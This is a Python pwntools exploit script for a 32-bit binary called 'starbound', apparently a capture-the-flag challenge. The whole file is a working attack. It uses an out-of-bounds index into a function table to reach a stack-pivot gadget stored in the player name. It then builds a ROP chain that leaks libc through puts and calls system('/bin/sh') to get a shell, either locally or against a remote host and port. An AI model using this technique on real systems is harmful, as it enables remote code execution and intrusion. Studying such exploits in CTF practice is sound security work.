#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from enum import Enum

exe = context.binary = ELF('starbound')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, *a, **kw)

gdbscript = '''
b *0x8049CDB
b *0x804A654
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

class Settings(Enum):
    BACK        = 1
    SET_NAME    = 2
    SET_IP      = 3
    TOGGLE      = 4

def init():
    global io

    io = start()

def cmd_settings(setting: Settings, arg: bytes = b""):
    io.sendlineafter(b">", b"6")
    io.sendlineafter(b">", str(setting.value).encode())

    match setting:
        case Settings.SET_NAME:
            io.sendafter(b"name:", arg)
            cmd_settings(Settings.BACK)
        case Settings.SET_IP:
            io.sendafter(b"address:", arg)
            cmd_settings(Settings.BACK)
        case _:
            io.sendlineafter(b">", str(Settings.BACK.value).encode())

def do_call(idx: int, pad: bytes):
    io.sendlineafter(b">", str(idx).encode() + pad)

def solve():

    func_table = 0x8058154
    player = 0x080580D0
    offset = (player - func_table) // 4
    pivot_gadet = 0x0804a171 # add esp, 0x10 ; pop ebx ; pop esi ; pop edi ; ret

    cmd_settings(Settings.SET_NAME, p32(pivot_gadet) + b"A"*4)
    do_call(offset, pad=b"A"*5 + p32(exe.plt["puts"]) + p32(exe.sym["main"]) + p32(exe.got["puts"]))

    leak = io.recvline()
    puts = u32(leak[1:5])
    libc_base = puts - 0x5fca0
    info("libc base: %#x", libc_base)

    system = libc_base + 0x3ada0
    bin_sh = libc_base + 0x15b82b

    cmd_settings(Settings.SET_NAME, p32(pivot_gadet) + b"A"*4)
    do_call(offset, pad=b"A"*5 + p32(system) + p32(0) + p32(bin_sh))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()